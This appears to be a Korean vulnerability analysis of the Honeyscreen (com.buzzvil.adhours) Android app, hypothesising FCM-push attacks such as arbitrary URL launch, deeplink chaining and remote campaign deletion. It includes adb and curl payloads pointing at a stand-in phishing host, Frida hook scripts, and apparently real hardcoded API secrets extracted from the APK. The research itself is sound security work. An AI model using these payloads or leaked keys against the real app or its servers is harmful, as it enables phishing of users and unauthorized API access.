# FCM 기반 공격 체인 분석 — 가설 및 검증 계획

**대상 APK:** com.buzzvil.adhours v14.5.5.1 (build 14551)  
**분석일:** 2026-04-03  
**분석 단계:** 정적 분석 완료 → 가설 수립 → 동적 검증 필요

---

## 0. 공격 전제 조건 분석

FCM push를 임의로 보내려면 Firebase Server Key 또는 프로젝트 접근 권한이 필요하다.

**BuildConfig에서 추출된 키:**

```
BS_APP_ID / BS_UNIT_ID  = "100000043"
BA_APP_ID               = "183837247389941"
BUZZBANNER_APP_ID       = "f522bf0750f711ebad7c02d559cc97d0"
BUZZBANNER_APP_SECRET   = "f73c78c950f811ebad7c02d559cc97d0fba953c950f811ebad7c02d559cc97d0"
DFINERY_APP_KEY         = "KGTfl9Gj3EqlY68Byj8PfQ"
DFINERY_SECRET_KEY      = "kjHQyH1Fj0SFFHQLj7y78A"
ADMOB_UNIT_ID           = "ca-app-pub-1335255668096277/8752338893"
SERVER_URL              = "https://krapi.honeyscreen.com"
DEV_SERVER_URL          = "https://test.honeyscreen.com"
STAGING_SERVER_URL      = "https://kr-staging.honeyscreen.com"
```

Firebase 관련 키(`google_api_key`, `gcm_defaultSenderId`, `google_app_id`)는 `res/values/strings.xml` 리소스에서 런타임 로드 (`StringResourceValueReader`를 통해). APK 언패킹으로 직접 추출 가능.

**참고:** `google_api_key`는 FCM 메시지 전송에 직접 사용되지 않음. 전송에는 Firebase Cloud Messaging API(v1)의 서비스 계정 키 또는 레거시 Server Key가 필요. 다만 `gcm_defaultSenderId`(프로젝트 번호)는 타겟팅에 활용 가능.

---

## 1. 전체 FCM 공격 체인

```
[공격자] FCM Server Key 탈취 또는 서버사이드 injection
    │
    ▼ HTTP POST → https://fcm.googleapis.com/fcm/send
    │  Authorization: key=<SERVER_KEY>
    │  Body: {
    │    "to": "<DEVICE_FCM_TOKEN>",
    │    "data": {
    │      "type": "notification",
    │      "title": "...",
    │      "content": "...",
    │      "link": "<ATTACKER_CONTROLLED_URL>",
    │      "category": "...",
    │      "ticker": "...",
    │      "campaign_type": "...",
    │      "ext": "...",
    │      "payload": "..."
    │    }
    │  }
    │
    ▼ FirebaseInstanceIdReceiver (exported=true, c2dm perm)
    ▼ CloudMessagingReceiver.onMessageReceive()
    ▼ C2308m.k() → Tasks.await()
    ▼ FirebaseMessagingService.handleIntent()
    ▼ .n() → message_type == "gcm"
    ▼ .j() → I.t(extras) notification display check
    ▼ onMessageReceived(RemoteMessage(extras))
    │
    ▼ BilliFcmListenerService.onMessageReceived(remoteMessage)
    │
    ├─ PushNotificationMapper.transform(remoteMessage)
    │  │  remoteMessage.getData() 에서 키-값 추출:
    │  │  ┌─────────────────┬────────────────────────────┐
    │  │  │ FCM data key    │ PushNotification field      │
    │  │  ├─────────────────┼────────────────────────────┤
    │  │  │ push_message_id │ id                         │
    │  │  │ title           │ title                      │
    │  │  │ content         │ content                    │
    │  │  │ type            │ type          ← 게이트키퍼 │
    │  │  │ campaign_type   │ campaignType                │
    │  │  │ category        │ category      ← 분기 조건  │
    │  │  │ ticker          │ ticker                     │
    │  │  │ link            │ link          ← SINK #1    │
    │  │  │ ext             │ extra         ← SINK #2    │
    │  │  │ payload         │ payload       ← 미사용?    │
    │  │  └─────────────────┴────────────────────────────┘
    │  │  ※ 어떤 필드에도 검증/필터링 없음
    │
    ├─ type == "notification" 체크
    │  └→ false: 리턴 (아무것도 안 함)
    │  └→ true: 계속 진행
    │
    ├─ [경로 A] category != "reward"
    │  │
    │  ├→ Intent(NotificationLaunchActivity.class)
    │  │   .putExtra("link", pushNotification.getLink())  ← 임의 URL
    │  │   .putExtra("messageId", pushNotification.getId())
    │  │
    │  ├→ PendingIntent.getActivity(flags=1140850688)
    │  │   = FLAG_UPDATE_CURRENT | FLAG_IMMUTABLE
    │  │
    │  └→ p() → NotificationManager.notify()
    │      (사용자에게 노티 표시)
    │
    │  사용자 노티 클릭 시:
    │  ▼ NotificationLaunchActivity.onCreate()
    │      ├→ stringExtra2 = getStringExtra("link")
    │      ├→ StringUtil.isBlank() 체크
    │      │   (null, "", "null" 만 체크 — URL 검증 없음)
    │      └→ Intent(ACTION_VIEW, Uri.parse(stringExtra2))
    │          startActivity(intent2)  ← ★ ARBITRARY URL LAUNCH ★
    │
    └─ [경로 B] category == "reward"
       │
       ├→ q(campaignType, extra)
       │   └→ campaignType == "action"?
       │       └→ YES: Integer.valueOf(extra)
       │           └→ o(campaignId)
       │               └→ sendBroadcast(BUZZ_REMOVE_CAMPAIGN)
       │                   extras: APP_KEY="100000043", CAMPAIGN_ID=<ext>
       │                   └→ BuzzLocker.removeCampaignInPool(id)
       │                   ★ REMOTE CAMPAIGN DELETION ★
       │
       └→ billiPreference.isEnableNotification()?
           └→ YES: p() → 노티 표시 (위와 동일한 link sink 포함)
```

---

## 2. 가설 목록

### 가설 H1: Arbitrary URL Launch via FCM `link` field

**가설:** FCM push의 `link` 필드에 임의 URL을 넣으면, 사용자 노티 클릭 시 검증 없이 외부 브라우저에서 열린다.

**근거:**
- `PushNotificationMapper.transform()`에서 `link` 필드를 검증 없이 그대로 `PushNotification.link`에 저장
- `NotificationLaunchActivity.onCreate()`에서 `Uri.parse(link)` → `ACTION_VIEW` intent로 직접 실행
- `StringUtil.isBlank()`는 null/empty/"null" 만 체크하며 URL 스킴이나 도메인 화이트리스트 검증이 전혀 없음

**영향도:** High — 피싱, 크리덴셜 수확, 악성 앱 설치 유도

**검증 방법:**
```bash
# 1. 로컬 테스트 (adb로 NotificationLaunchActivity 직접 호출)
adb shell am start -n com.buzzvil.adhours/.common.fcm.NotificationLaunchActivity \
  --es link "https://evil.example.com/phishing"

# 2. FCM API 테스트 (Server Key 필요)
curl -X POST https://fcm.googleapis.com/fcm/send \
  -H "Authorization: key=<SERVER_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "to": "<DEVICE_TOKEN>",
    "data": {
      "type": "notification",
      "title": "테스트 알림",
      "content": "확인해주세요",
      "link": "https://evil.example.com/phishing",
      "category": "event",
      "ticker": "허니스크린"
    }
  }'

# 3. Frida 훅으로 실제 URI 확인
# NotificationLaunchActivity.onCreate에서 startActivity 직전 인터셉트
```

**예상 결과:** 외부 브라우저에서 `https://evil.example.com/phishing` 오픈

---

### 가설 H2: Intent Scheme Injection via `link` field

**가설:** `link` 필드에 `intent://` 스킴을 넣으면 내부 컴포넌트를 호출할 수 있다.

**근거:**
- `Uri.parse()` → `ACTION_VIEW` → `startActivity()`는 `intent://` 스킴을 해석할 수 있음
- 단, Android 5.0+ 에서는 `Intent.parseUri()` 대신 `Uri.parse()`를 사용하는 경우 `intent://` 스킴이 ACTION_VIEW로 처리되어 직접적인 implicit intent 해석은 안 됨

**검증 방법:**
```bash
# intent:// scheme 테스트
adb shell am start -n com.buzzvil.adhours/.common.fcm.NotificationLaunchActivity \
  --es link "intent://screen#Intent;scheme=honeyscreenkr;end"

# 커스텀 스킴 테스트 (앱 내부 deeplink)
adb shell am start -n com.buzzvil.adhours/.common.fcm.NotificationLaunchActivity \
  --es link "honeyscreenkr://lockscreen"

# buzzscreen 스킴 테스트
adb shell am start -n com.buzzvil.adhours/.common.fcm.NotificationLaunchActivity \
  --es link "buzzscreen://com.buzzvil.adhours"
```

**분석:**
- `Uri.parse("intent://...")` → `ACTION_VIEW`로 처리 시 보통 "No Activity found" 예외
- **그러나** `honeyscreenkr://lockscreen` 같은 커스텀 스킴은 정상 작동할 가능성 높음
- `LockScreenDeepLinkActivity`가 exported=true + `honeyscreenkr://lockscreen` 필터 있으므로, FCM push로 잠금화면 강제 활성화 가능

**영향도:** Medium — 앱 내부 deeplink를 FCM push로 트리거하여 의도하지 않은 기능 실행

---

### 가설 H3: Remote Campaign Deletion via FCM

**가설:** FCM push의 `category=reward`, `campaign_type=action`, `ext=<campaign_id>`로 특정 광고 캠페인을 원격 삭제할 수 있다.

**근거:**
- `BilliFcmListenerService.onMessageReceived()` → `q()` 메서드에서:
  - `campaignType == "action"` 이면 `ext`를 Integer로 변환
  - `o(campaignId)` → `sendBroadcast(BUZZ_REMOVE_CAMPAIGN)` 실행
  - APP_KEY는 `"100000043"`으로 하드코딩됨
- `BuzzCustomReceiver`에서 `appKey == BuzzScreen.getAppKey()` 체크만 있고, 발신자 인증 없음

**검증 방법:**
```bash
# FCM API로 캠페인 삭제 트리거
curl -X POST https://fcm.googleapis.com/fcm/send \
  -H "Authorization: key=<SERVER_KEY>" \
  -H "Content-Type: application/json" \
  -d '{
    "to": "<DEVICE_TOKEN>",
    "data": {
      "type": "notification",
      "category": "reward",
      "campaign_type": "action",
      "ext": "12345",
      "title": "리워드 도착",
      "content": "확인하세요",
      "ticker": "허니스크린",
      "link": ""
    }
  }'

# Frida 훅으로 BuzzLocker.removeCampaignInPool 호출 확인
Java.perform(function() {
    var BuzzLocker = Java.use("com.buzzvil.locker.BuzzLocker");
    BuzzLocker.removeCampaignInPool.implementation = function(id) {
        console.log("[*] removeCampaignInPool called with id: " + id);
        // this.removeCampaignInPool(id);  // 실제 삭제 차단
    };
});
```

**영향도:** Medium — 광고 수익에 영향, 대량 캠페인 삭제 시 비즈니스 임팩트

---

### 가설 H4: Internal Deeplink Chaining via FCM

**가설:** FCM `link` 필드에 앱 내부 커스텀 스킴을 넣으면, 여러 exported Activity를 체이닝할 수 있다.

**근거:** 다음 exported Activity들이 커스텀 스킴으로 접근 가능:

| Activity | Scheme | 기능 |
|----------|--------|------|
| SplashActivity | `honeyscreenkr://screen` | 앱 진입점, redirect 파라미터 처리 |
| BuyGiftActivity | `honeyscreenbuykr://screen` | 기프트 구매 |
| LockScreenDeepLinkActivity | `honeyscreenkr://lockscreen` | 잠금화면 강제 활성화 |
| BuzzAdBenefitActivity | `honeyscreenkr://buzzadbenefit` | 광고 혜택 화면 |
| CustomLandingHelperActivity | `buzzscreen://com.buzzvil.adhours` | 커스텀 랜딩 |
| BuzzBenefitHubDeepLinkActivity | `buzzad://com.buzzvil.adhours/feed` | 피드 화면 |

**체이닝 시나리오:**
```
FCM push (link: "honeyscreenkr://lockscreen")
    → 사용자 노티 클릭
    → NotificationLaunchActivity
    → ACTION_VIEW, Uri.parse("honeyscreenkr://lockscreen")
    → LockScreenDeepLinkActivity.onCreate()
    → BuzzScreen.activate() → 잠금화면 강제 활성화
```

**검증 방법:**
```bash
# 각 deeplink 스킴 테스트
adb shell am start -n com.buzzvil.adhours/.common.fcm.NotificationLaunchActivity \
  --es link "honeyscreenkr://screen?tab=store&sub_tab=gift&extra_data=test"

adb shell am start -n com.buzzvil.adhours/.common.fcm.NotificationLaunchActivity \
  --es link "honeyscreenbuykr://screen"

adb shell am start -n com.buzzvil.adhours/.common.fcm.NotificationLaunchActivity \
  --es link "honeyscreenkr://lockscreen"
```

**영향도:** Medium-High — 잠금화면 강제 활성화, 특정 화면 강제 이동, 구매 화면 유도

---

### 가설 H5: `NotificationLaunchActivity` exported 여부에 따른 직접 공격

**가설:** `NotificationLaunchActivity`가 exported=true이거나 intent-filter가 있으면, 같은 디바이스의 악성 앱에서 직접 호출 가능.

**현재 상태:** Manifest에서 exported activity 목록에 `NotificationLaunchActivity`는 **포함되지 않음**. 따라서 exported=false로 추정.

**결론:** 로컬 앱에서 직접 호출은 불가 (동일 UID 제외). FCM 경로가 유일한 공격 벡터.

---

## 3. 공격 시나리오 요약 매트릭스

| ID | 시나리오 | 전제조건 | 사용자 인터랙션 | 영향도 | 검증 상태 |
|----|---------|---------|---------------|--------|----------|
| H1 | 피싱 URL via FCM link | Server Key 탈취 | 노티 클릭 1회 | **High** | 정적 분석 확인, 동적 검증 필요 |
| H2 | intent:// scheme injection | Server Key 탈취 | 노티 클릭 1회 | Medium | Uri.parse vs parseUri 동작 차이 확인 필요 |
| H3 | 원격 캠페인 삭제 | Server Key 탈취 | **없음** (silent) | Medium | 정적 분석 확인, 동적 검증 필요 |
| H4 | 내부 deeplink 체이닝 | Server Key 탈취 | 노티 클릭 1회 | **Med-High** | deeplink 스킴 확인 완료, 동작 검증 필요 |
| H5 | 로컬 앱 직접 호출 | 악성 앱 설치 | 없음 | Low | exported=false 확인 — 불가 |

---

## 4. 검증 우선순위

```
[1순위] H1 — adb로 NotificationLaunchActivity 직접 호출 테스트
              가장 간단하고 영향도가 높음
              exported=false이므로 run-as 또는 동일 APK 서명 필요
              → 대안: Frida로 onMessageReceived 후킹하여 link 필드 변조

[2순위] H4 — 각 deeplink 스킴 → NotificationLaunchActivity 경유 테스트
              honeyscreenkr://lockscreen 으로 잠금화면 강제 활성화 확인

[3순위] H3 — Frida로 BuzzLocker.removeCampaignInPool 후킹
              실제 캠페인 삭제 여부 모니터링

[4순위] H2 — intent:// scheme 처리 동작 확인
              Uri.parse()의 한계로 실패할 가능성 높지만 확인 필요
```

---

## 5. Frida 검증 스크립트 (H1/H4 통합)

```javascript
// fcm_link_monitor.js
// 용도: FCM push의 link 필드가 실제로 어떻게 처리되는지 모니터링
// Tested: Android 10+, Frida 16.x

Java.perform(function() {
    
    // 1. FCM 메시지 수신 모니터링
    var BilliFcm = Java.use("com.buzzvil.adhours.common.fcm.BilliFcmListenerService");
    BilliFcm.onMessageReceived.implementation = function(remoteMessage) {
        console.log("\n[*] ===== FCM MESSAGE RECEIVED =====");
        var data = remoteMessage.getData();
        console.log("[*] type     : " + data.get("type"));
        console.log("[*] category : " + data.get("category"));
        console.log("[*] link     : " + data.get("link"));
        console.log("[*] campaign : " + data.get("campaign_type"));
        console.log("[*] ext      : " + data.get("ext"));
        console.log("[*] payload  : " + data.get("payload"));
        console.log("[*] ====================================\n");
        
        // 원본 호출 (테스트 시 주석 처리하여 차단 가능)
        this.onMessageReceived(remoteMessage);
    };
    
    // 2. NotificationLaunchActivity URI 처리 모니터링
    var NLA = Java.use("com.buzzvil.adhours.common.fcm.NotificationLaunchActivity");
    NLA.onCreate.implementation = function(bundle) {
        var intent = this.getIntent();
        var link = intent.getStringExtra("link");
        var msgId = intent.getStringExtra("messageId");
        
        console.log("\n[*] ===== NotificationLaunchActivity =====");
        console.log("[*] link      : " + link);
        console.log("[*] messageId : " + msgId);
        
        if (link != null) {
            var Uri = Java.use("android.net.Uri");
            var parsed = Uri.parse(link);
            console.log("[*] scheme    : " + parsed.getScheme());
            console.log("[*] host      : " + parsed.getHost());
            console.log("[*] path      : " + parsed.getPath());
        }
        console.log("[*] ==========================================\n");
        
        this.onCreate(bundle);
    };
    
    // 3. 캠페인 삭제 모니터링
    var BuzzLocker = Java.use("com.buzzvil.locker.BuzzLocker");
    BuzzLocker.removeCampaignInPool.overload('long').implementation = function(id) {
        console.log("[!] CAMPAIGN REMOVAL TRIGGERED: id=" + id);
        // this.removeCampaignInPool(id);  // 삭제 차단 시 주석 해제
        return;
    };
    
    // 4. startActivity 인터셉트 (ACTION_VIEW 감시)
    var Activity = Java.use("android.app.Activity");
    Activity.startActivity.overload("android.content.Intent").implementation = function(intent) {
        var action = intent.getAction();
        var data = intent.getData();
        if (action == "android.intent.action.VIEW" && data != null) {
            console.log("[!] ACTION_VIEW: " + data.toString());
            console.log("[!]   scheme: " + data.getScheme());
            console.log("[!]   host  : " + data.getHost());
        }
        this.startActivity(intent);
    };
    
    console.log("[+] FCM link monitor hooks installed");
});
```

---

## 6. 하드코딩된 시크릿 키 (별도 보고)

| 키 | 값 | 용도 | 위험도 |
|----|----|------|--------|
| BUZZBANNER_APP_SECRET | `f73c78c...cc97d0` | BuzzBanner API 인증 | **High** — API 호출 위조 가능 |
| DFINERY_SECRET_KEY | `kjHQyH1Fj0SFFHQLj7y78A` | Dfinery(구 adbrix) 분석 API | Medium |
| DFINERY_APP_KEY | `KGTfl9Gj3EqlY68Byj8PfQ` | Dfinery 앱 식별 | Low |
| BS_APP_ID | `100000043` | BuzzScreen SDK 앱 키 | Low (공개 식별자) |
| SERVER_URL | `https://krapi.honeyscreen.com` | 프로덕션 API | Info |
| DEV_SERVER_URL | `https://test.honeyscreen.com` | 개발/테스트 API | **Medium** — 테스트 서버 접근 시도 가능 |
| STAGING_SERVER_URL | `https://kr-staging.honeyscreen.com` | 스테이징 API | **Medium** — 프로덕션 대비 보안 약할 수 있음 |

---

> 본 문서는 JADX MCP 정적 분석 기반 가설이며, 실제 취약점 확정은 동적 검증 후 결정
